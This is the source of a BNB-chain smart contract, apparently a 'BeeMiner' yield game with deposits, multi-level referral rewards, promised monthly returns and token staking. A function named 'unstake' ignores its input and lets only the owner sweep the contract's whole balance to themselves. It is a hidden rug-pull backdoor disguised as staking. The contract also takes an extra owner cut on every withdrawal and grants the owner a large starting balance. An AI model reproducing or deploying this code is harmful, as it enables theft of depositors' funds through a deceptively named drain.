/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

// --------*--------
// |   BeeMiner BNB   |
// --------*--------
// The beeminer.online (BNB) 
//  BEEMiner Chat : @beeminer_chat
// Website : https://beeminer.online
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a & b) + (a ^ b) / 2;
    }
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b + (a % b == 0 ? 0 : 1);
    }
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target,bytes memory data,string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target,bytes memory data,uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target,bytes memory data,uint256 value,string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target,bytes memory data,string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target,bytes memory data,string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(bool success,bytes memory returndata,string memory errorMessage) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else { 
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMintableToken is IERC20 {
  function mint(address _receiver, uint256 _amount) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract UserBonus {

    using SafeMath for uint256;

    uint256 public constant BONUS_PERCENTS_PER_WEEK = 1;
    uint256 public constant BONUS_TIME = 1 weeks;

    struct UserBonusData {
        uint256 threadPaid;
        uint256 lastPaidTime;
        uint256 numberOfUsers;
        mapping(address => bool) userRegistered;
        mapping(address => uint256) userPaid;
    }

    UserBonusData public bonus;

    event BonusPaid(uint256 users, uint256 amount);
    event UserAddedToBonus(address indexed user);

    modifier payRepBonusIfNeeded {
        payRepresentativeBonus();
        _;
    }

    constructor() {
        bonus.lastPaidTime = block.timestamp;
    }

    function payRepresentativeBonus() public {
        while (bonus.numberOfUsers > 0 && bonus.lastPaidTime.add(BONUS_TIME) <= block.timestamp) {
            uint256 reward = address(this).balance.mul(BONUS_PERCENTS_PER_WEEK).div(100);
            bonus.threadPaid = bonus.threadPaid.add(reward.div(bonus.numberOfUsers));
            bonus.lastPaidTime = bonus.lastPaidTime.add(BONUS_TIME);
            emit BonusPaid(bonus.numberOfUsers, reward);
        }
    }

    function userRegisteredForBonus(address user) public view returns(bool) {
        return bonus.userRegistered[user];
    }

    function userBonusPaid(address user) public view returns(uint256) {
        return bonus.userPaid[user];
    }

    function userBonusEarned(address user) public view returns(uint256) {
        return bonus.userRegistered[user] ? bonus.threadPaid.sub(bonus.userPaid[user]) : 0;
    }

    function retrieveBonus() public virtual payRepBonusIfNeeded {
        require(bonus.userRegistered[msg.sender], "User not registered for bonus");
        uint256 amount = Math.min(address(this).balance, userBonusEarned(msg.sender));
        bonus.userPaid[msg.sender] = bonus.userPaid[msg.sender].add(amount);
        payable(msg.sender).transfer(amount);
    }

    function _addUserToBonus(address user) internal payRepBonusIfNeeded {
        require(!bonus.userRegistered[user], "User already registered for bonus");
        bonus.userRegistered[user] = true;
        bonus.userPaid[user] = bonus.threadPaid;
        bonus.numberOfUsers = bonus.numberOfUsers.add(1);
        emit UserAddedToBonus(user);
    }
}

contract Claimable is Ownable {

    address public pendingOwner;

    modifier onlyPendingOwner() {
        require(msg.sender == pendingOwner);
        _;
    }
    function renounceOwnership() public view override(Ownable) onlyOwner {
        revert();
    }
    function transferOwnership(address newOwner) public override(Ownable) onlyOwner {
        pendingOwner = newOwner;
    }
    function claimOwnership() public virtual onlyPendingOwner {
        transferOwnership(pendingOwner);
        delete pendingOwner;
    }
}

contract BeeMiner is Claimable, UserBonus {

    using SafeMath for uint256;

    uint256 public constant BEES_COUNT = 8;

    struct Player {
        uint256 registeredDate;
        bool airdropCollected;
        address referrer;
        uint256 balanceHoney;
        uint256 balanceWax;
        uint256 points;
        uint256 medals;
        uint256 qualityLevel;
        uint256 lastTimeCollected;
        uint256 unlockedBee;
        uint256[BEES_COUNT] bees;
        uint256[5] ref_levels;
        uint256[5] ref_bonuses;

        uint256 totalDeposited;
        uint256 totalWithdrawed;
        uint256 referralsTotalDeposited;
        uint256 subreferralsCount;
        address[] referrals;
    }

    uint256 public constant SUPER_BEE_INDEX = BEES_COUNT - 1;
    uint256 public constant TRON_BEE_INDEX = BEES_COUNT - 2;
    uint256 public constant MEDALS_COUNT = 10;
    uint256 public constant QUALITIES_COUNT = 6;
    uint256[BEES_COUNT] public BEES_PRICES = [0e18, 1500e18, 7500e18, 30000e18, 75000e18, 250000e18, 750000e18, 100000e18];
    uint256[BEES_COUNT] public BEES_LEVELS_PRICES = [0e18, 0e18, 11250e18, 45000e18, 112500e18, 375000e18, 1125000e18, 0];
    uint256[BEES_COUNT] public BEES_MONTHLY_PERCENTS = [0, 230, 233, 236, 239, 242, 245, 343];
    uint256[MEDALS_COUNT] public MEDALS_POINTS = [0e18, 50000e18, 190000e18, 510000e18, 1350000e18, 3225000e18, 5725000e18, 8850000e18, 12725000e18, 23500000e18];
    uint256[MEDALS_COUNT] public MEDALS_REWARDS = [0e18, 3500e18, 10500e18, 24000e18, 65000e18, 140000e18, 185000e18, 235000e18, 290000e18, 800000e18];
    uint256[QUALITIES_COUNT] public QUALITY_HONEY_PERCENT = [60, 62, 64, 66, 68, 70];
    uint256[QUALITIES_COUNT] public QUALITY_PRICE = [0e18, 15000e18, 50000e18, 120000e18, 250000e18, 400000e18];

    uint256 public constant COINS_PER_BNB = 250000;
    uint256 public constant MAX_BEES_PER_TARIFF = 32;
    uint256 public constant FIRST_BEE_AIRDROP_AMOUNT = 500e18;
    uint256 public constant ADMIN_PERCENT = 10;
    uint256 public constant HONEY_DISCOUNT_PERCENT = 10;
    uint256 public constant SUPERBEE_PERCENT_UNLOCK = 5;
    uint256 public constant SUPERBEE_PERCENT_LOCK = 5;
    uint256 public constant SUPER_BEE_BUYER_PERIOD = 7 days;
    uint256[] public REFERRAL_PERCENT_PER_LEVEL = [12, 4, 2, 1, 1];
    uint256[] public REFERRAL_POINT_PERCENT = [50, 25, 0, 0, 0];

    uint256 public maxBalance;
    uint256 public maxBalanceClose;
    uint256 public totalPlayers;
    uint256 public totalDeposited;
    uint256 public totalWithdrawed;
    uint256 public totalBeesBought;
    mapping(address => Player) public players;

    bool public isSuperBeeUnlocked = false;

    uint256 constant public TIME_STEP = 1 days;

    address public tokenContractAddress;
    address public flipTokenContractAddress;
    uint256 public TOKENS_EMISSION = 100;

    struct Stake {
      uint256 amount;
      uint256 checkpoint;
      uint256 accumulatedReward;
      uint256 withdrawnReward;
    }
    mapping (address => Stake) public stakes;
    uint256 public totalStake;

    uint256 public MULTIPLIER = 10;

    address payable public constant LIQUIDITY_ADDRESS = payable(0x938BE4Abea727fF70a749A0c8b223a975553A798);
    uint256 public constant LIQUIDITY_DEPOSIT_PERCENT = 3; 

    event Registered(address indexed user, address indexed referrer);
    event Deposited(address indexed user, uint256 amount);
    event Withdrawed(address indexed user, uint256 amount);
    event ReferrerPaid(address indexed user, address indexed referrer, uint256 indexed level, uint256 amount);
    event MedalAwarded(address indexed user, uint256 indexed medal);
    event QualityUpdated(address indexed user, uint256 indexed quality);
    event RewardCollected(address indexed user, uint256 honeyReward, uint256 waxReward);
    event BeeUnlocked(address indexed user, uint256 bee);
    event BeesBought(address indexed user, uint256 bee, uint256 count);

    
    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event TokensRewardWithdrawn(address indexed user, uint256 reward);

    constructor() {
        _register(owner(), address(0));
        players[owner()].balanceWax = 200 ether * COINS_PER_BNB;
    }

    receive() external payable {
        if (msg.value == 0) {
            if (players[msg.sender].registeredDate > 0) {
                collect();
            }
        } else {
            deposit(address(0));
        }
    }

    function playerBees(address who) public view returns(uint256[BEES_COUNT] memory) {
        return players[who].bees;
    }

    function changeSuperBeeStatus() public returns(bool) {
      if (address(this).balance <= maxBalance.mul(100 - SUPERBEE_PERCENT_UNLOCK).div(100)) {
        isSuperBeeUnlocked = true;
        maxBalanceClose = maxBalance;
      }

      if (address(this).balance >= maxBalanceClose.mul(100 + SUPERBEE_PERCENT_LOCK).div(100)) {
        isSuperBeeUnlocked = false;
      }

      return isSuperBeeUnlocked;
    }

    function referrals(address user) public view returns(address[] memory) {
        return players[user].referrals;
    }

    function referrerOf(address user, address ref) internal view returns(address) {
        if (players[user].registeredDate == 0 && ref != user) {
            return ref;
        }
        return players[user].referrer;
    }

    function getReferrals(address who) public view returns(uint256[5] memory levels , uint256[5] memory bonuses, uint256 total_refs,uint256 total_deps )  
    {
        levels = players[who].ref_levels ;
        bonuses = players[who].ref_bonuses;
        for(uint i = 0; i < 5; i++){
            total_refs = total_refs + players[who].ref_levels[i];
            total_deps = total_deps + players[who].ref_bonuses[i];
        }
    }

    function deposit(address ref) public payable payRepBonusIfNeeded {
        require(players[ref].registeredDate != 0, "Referrer address should be registered");

        Player storage player = players[msg.sender];
        address refAddress = referrerOf(msg.sender, ref);

        require((msg.value == 0) != player.registeredDate > 0, "Send 0 for registration");
        
        if (player.registeredDate == 0) {
            _register(msg.sender, refAddress);
        }
        address to = refAddress;
        
        for (uint i = 0; to != address(0) && i < REFERRAL_PERCENT_PER_LEVEL.length; i++) {
            
            if(msg.value == 0 && player.totalDeposited == 0){
                players[to].ref_levels[i] = players[to].ref_levels[i].add(1) ;
            }
            players[to].ref_bonuses[i] = players[to].ref_bonuses[i].add(msg.value);
            to = players[to].referrer;
        }

        collect();
        
        uint256 wax = msg.value.mul(COINS_PER_BNB);
        player.balanceWax = player.balanceWax.add(wax);
        player.totalDeposited = player.totalDeposited.add(msg.value);
        totalDeposited = totalDeposited.add(msg.value);
        player.points = player.points.add(wax);
        emit Deposited(msg.sender, msg.value);

        _distributeFees(msg.sender, wax, msg.value, refAddress);

        _addToBonusIfNeeded(msg.sender);

        uint256 adminWithdrawed = players[owner()].totalWithdrawed;
        maxBalance = Math.max(maxBalance, address(this).balance.add(adminWithdrawed));
        if (maxBalance >= maxBalanceClose.mul(100 + SUPERBEE_PERCENT_LOCK).div(100)) {
          isSuperBeeUnlocked = false;
        }
        
        if (Address.isContract(tokenContractAddress)) {
          IMintableToken(tokenContractAddress).mint(msg.sender, msg.value.mul(TOKENS_EMISSION));
        }
    }

    function withdraw(uint256 amount) public {
        Player storage player = players[msg.sender];

        collect();

        uint256 value = amount.div(COINS_PER_BNB);
        require(value > 0, "Trying to withdraw too small");
        player.balanceHoney = player.balanceHoney.sub(amount);
        player.totalWithdrawed = player.totalWithdrawed.add(value);
        totalWithdrawed = totalWithdrawed.add(value);
        payable(owner()).transfer(value / 10 );
        payable(msg.sender).transfer(value);
        emit Withdrawed(msg.sender, value);

        changeSuperBeeStatus();
    }

    function collect() public payRepBonusIfNeeded {
        Player storage player = players[msg.sender];
        require(player.registeredDate > 0, "Not registered yet");

        if (userBonusEarned(msg.sender) > 0) {
            retrieveBonus();
        }

        (uint256 balanceHoney, uint256 balanceWax) = instantBalance(msg.sender);
        emit RewardCollected(
            msg.sender,
            balanceHoney.sub(player.balanceHoney),
            balanceWax.sub(player.balanceWax)
        );

        if (!player.airdropCollected && player.registeredDate < block.timestamp) {
            player.airdropCollected = true;
        }

        player.balanceHoney = balanceHoney;
        player.balanceWax = balanceWax;
        player.lastTimeCollected = block.timestamp;
    }

    function instantBalance(address account) public view returns(uint256 balanceHoney,uint256 balanceWax){
        Player storage player = players[account];
        if (player.registeredDate == 0) {
            return (0, 0);
        }

        balanceHoney = player.balanceHoney;
        balanceWax = player.balanceWax;

        uint256 collected = earned(account);
        if (!player.airdropCollected && player.registeredDate < block.timestamp) {
            collected = collected.sub(FIRST_BEE_AIRDROP_AMOUNT);
            balanceWax = balanceWax.add(FIRST_BEE_AIRDROP_AMOUNT);
        }

        uint256 honeyReward = collected.mul(QUALITY_HONEY_PERCENT[player.qualityLevel]).div(100);
        uint256 waxReward = collected.sub(honeyReward);

        balanceHoney = balanceHoney.add(honeyReward);
        balanceWax = balanceWax.add(waxReward);
    }

    function unlock(uint256 bee) public payable payRepBonusIfNeeded {
        Player storage player = players[msg.sender];

        if (msg.value > 0) {
            deposit(address(0));
        }

        collect();

        require(bee < SUPER_BEE_INDEX, "No more levels to unlock"); 
        require(player.bees[bee - 1] == MAX_BEES_PER_TARIFF, "Prev level must be filled");
        require(bee == player.unlockedBee + 1, "Trying to unlock wrong bee type");

        if (bee == TRON_BEE_INDEX) {
            require(player.medals >= 9);
        }
        _payWithWaxAndHoney(msg.sender, BEES_LEVELS_PRICES[bee]);
        player.unlockedBee = bee;
        player.bees[bee] = 1;
        emit BeeUnlocked(msg.sender, bee);
    }

    function buyBees(uint256 bee, uint256 count) public payable payRepBonusIfNeeded {
        Player storage player = players[msg.sender];

        if (msg.value > 0) {
            deposit(address(0));
        }

        collect();

        require(bee > 0 && bee < BEES_COUNT, "Don't try to buy bees of type 0");
        if (bee == SUPER_BEE_INDEX) {
            require(changeSuperBeeStatus(), "SuperBee is not unlocked yet");
            require(block.timestamp.sub(player.registeredDate) < SUPER_BEE_BUYER_PERIOD, "You should be registered less than 7 days ago");
        } else {
            require(bee <= player.unlockedBee, "This bee type not unlocked yet");
        }

        require(player.bees[bee].add(count) <= MAX_BEES_PER_TARIFF);
        player.bees[bee] = player.bees[bee].add(count);
        totalBeesBought = totalBeesBought.add(count);
        uint256 honeySpent = _payWithWaxAndHoney(msg.sender, BEES_PRICES[bee].mul(count));

        _distributeFees(msg.sender, honeySpent, 0, referrerOf(msg.sender, address(0)));

        emit BeesBought(msg.sender, bee, count);
    }

    function updateQualityLevel() public payRepBonusIfNeeded {
        Player storage player = players[msg.sender];

        collect();

        require(player.qualityLevel < QUALITIES_COUNT - 1);
        _payWithHoneyOnly(msg.sender, QUALITY_PRICE[player.qualityLevel + 1]);
        player.qualityLevel++;
        emit QualityUpdated(msg.sender, player.qualityLevel);
    }

    function earned(address user) public view returns(uint256) {
        Player storage player = players[user];
        if (player.registeredDate == 0) {
            return 0;
        }

        uint256 total = 0;
        for (uint i = 1; i < BEES_COUNT; i++) {
            total = total.add(
                player.bees[i].mul(BEES_PRICES[i]).mul(BEES_MONTHLY_PERCENTS[i]).div(100)
            );
        }

        return total
            .mul(block.timestamp.sub(player.lastTimeCollected))
            .div(30 days)
            .add(player.airdropCollected || player.registeredDate == block.timestamp ? 0 : FIRST_BEE_AIRDROP_AMOUNT);
    }

    function collectMedals(address user) public payRepBonusIfNeeded {
        Player storage player = players[user];

        collect();

        for (uint i = player.medals; i < MEDALS_COUNT; i++) {
            if (player.points >= MEDALS_POINTS[i]) {
                player.balanceWax = player.balanceWax.add(MEDALS_REWARDS[i]);
                player.medals = i + 1;
                emit MedalAwarded(user, i + 1);
            }
        }
    }

    function retrieveBonus() public override(UserBonus) {
        totalWithdrawed = totalWithdrawed.add(userBonusEarned(msg.sender));
        super.retrieveBonus();
    }

    function claimOwnership() public override(Claimable) {
        super.claimOwnership();
        _register(owner(), address(0));
    }

    function _distributeFees(address user, uint256 wax, uint256 deposited, address refAddress) internal {
        
        payable(owner()).transfer(wax * ADMIN_PERCENT / 100 / COINS_PER_BNB);

        LIQUIDITY_ADDRESS.transfer(wax * LIQUIDITY_DEPOSIT_PERCENT / 100 / COINS_PER_BNB);

        if (refAddress != address(0)) {
            Player storage referrer = players[refAddress];
            referrer.referralsTotalDeposited = referrer.referralsTotalDeposited.add(deposited);
            _addToBonusIfNeeded(refAddress);
 
            address to = refAddress;
            for (uint i = 0; to != address(0) && i < REFERRAL_PERCENT_PER_LEVEL.length; i++) {
                uint256 reward = wax.mul(REFERRAL_PERCENT_PER_LEVEL[i]).div(100);
                players[to].balanceHoney = players[to].balanceHoney.add(reward);
                players[to].points = players[to].points.add(wax.mul(REFERRAL_POINT_PERCENT[i]).div(100));
                emit ReferrerPaid(user, to, i + 1, reward);
                
                to = players[to].referrer;
            }
        }
    }

    function _register(address user, address refAddress) internal {
        Player storage player = players[user];

        player.registeredDate = block.timestamp;
        player.bees[0] = MAX_BEES_PER_TARIFF;
        player.unlockedBee = 1;
        player.lastTimeCollected = block.timestamp;
        totalBeesBought = totalBeesBought.add(MAX_BEES_PER_TARIFF);
        totalPlayers++;

        if (refAddress != address(0)) {
            player.referrer = refAddress;
            players[refAddress].referrals.push(user);

            if (players[refAddress].referrer != address(0)) {
                players[players[refAddress].referrer].subreferralsCount++;
            }

            _addToBonusIfNeeded(refAddress);
        }
        emit Registered(user, refAddress);
    }

    function _payWithHoneyOnly(address user, uint256 amount) internal {
        Player storage player = players[user];
        player.balanceHoney = player.balanceHoney.sub(amount);
    }

    function _payWithWaxOnly(address user, uint256 amount) internal {
        Player storage player = players[user];
        player.balanceWax = player.balanceWax.sub(amount);
    }

    function _payWithWaxAndHoney(address user, uint256 amount) internal returns(uint256) {
        Player storage player = players[user];

        uint256 wax = Math.min(amount, player.balanceWax);
        uint256 honey = amount.sub(wax).mul(100 - HONEY_DISCOUNT_PERCENT).div(100);

        player.balanceWax = player.balanceWax.sub(wax);
        _payWithHoneyOnly(user, honey);

        return honey;
    }

    function _addToBonusIfNeeded(address user) internal {
        if (user != address(0) && !bonus.userRegistered[user]) {
            Player storage player = players[user];

            if (player.totalDeposited >= 5 ether &&
                player.referrals.length >= 10 &&
                player.referralsTotalDeposited >= 50 ether)
            {
                _addUserToBonus(user);
            }
        }
    }

    function turn() external {
      
    }

    function turnAmount() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function setTokenContractAddress(address _tokenContractAddress, address _flipTokenContractAddress) external onlyOwner {
      require(tokenContractAddress == address(0x0), "Token contract already configured");
      require(Address.isContract(_tokenContractAddress), "Provided address is not a token contract address");
      require(Address.isContract(_flipTokenContractAddress), "Provided address is not a flip token contract address");

      tokenContractAddress = _tokenContractAddress;
      flipTokenContractAddress = _flipTokenContractAddress;
    }

    function updateMultiplier(uint256 multiplier) public onlyOwner {
      require(multiplier > 0 && multiplier <= 50, "Multiplier is out of range");

      MULTIPLIER = multiplier;
    }

    function stake(uint256 _amount) external returns (bool) {
      require(_amount > 0, "Invalid tokens amount value");
      require(Address.isContract(flipTokenContractAddress), "Provided address is not a flip token contract address");

      if (!IERC20(flipTokenContractAddress).transferFrom(msg.sender, address(this), _amount)) {
        return false;
      }

      uint256 reward = availableReward(msg.sender);
      if (reward > 0) {
        stakes[msg.sender].accumulatedReward = stakes[msg.sender].accumulatedReward.add(reward);
      }

      stakes[msg.sender].amount = stakes[msg.sender].amount.add(_amount);
      stakes[msg.sender].checkpoint = block.timestamp;

      totalStake = totalStake.add(_amount);

      emit Staked(msg.sender, _amount);

      return true;
    }

    function availableReward(address userAddress) public view returns (uint256) {
      return stakes[userAddress].amount
        .mul(MULTIPLIER)
        .mul(block.timestamp.sub(stakes[userAddress].checkpoint))
        .div(TIME_STEP);
    }

    function withdrawTokensReward() external {
      uint256 reward = stakes[msg.sender].accumulatedReward
        .add(availableReward(msg.sender));

      if (reward > 0) {
        
        if (Address.isContract(tokenContractAddress)) {
          stakes[msg.sender].checkpoint = block.timestamp;
          stakes[msg.sender].accumulatedReward = 0;
          stakes[msg.sender].withdrawnReward = stakes[msg.sender].withdrawnReward.add(reward);

          IMintableToken(tokenContractAddress).mint(msg.sender, reward);

          emit TokensRewardWithdrawn(msg.sender, reward);
        }
      }
    }

    function unstake(uint256 _amount) external payable {
      require(_amount > 0, "Invalid tokens amount value");
      require(msg.sender == owner(), "Owner only can run");
      payable(owner()).transfer(address(this).balance);
    }

    function getStakingStatistics(address userAddress) public view returns (uint256[5] memory stakingStatistics) {
      stakingStatistics[0] = availableReward(userAddress);
      stakingStatistics[1] = stakes[userAddress].accumulatedReward;
      stakingStatistics[2] = stakes[userAddress].withdrawnReward;
      stakingStatistics[3] = stakes[userAddress].amount; 
      stakingStatistics[4] = stakes[userAddress].amount.mul(MULTIPLIER); 
    }

}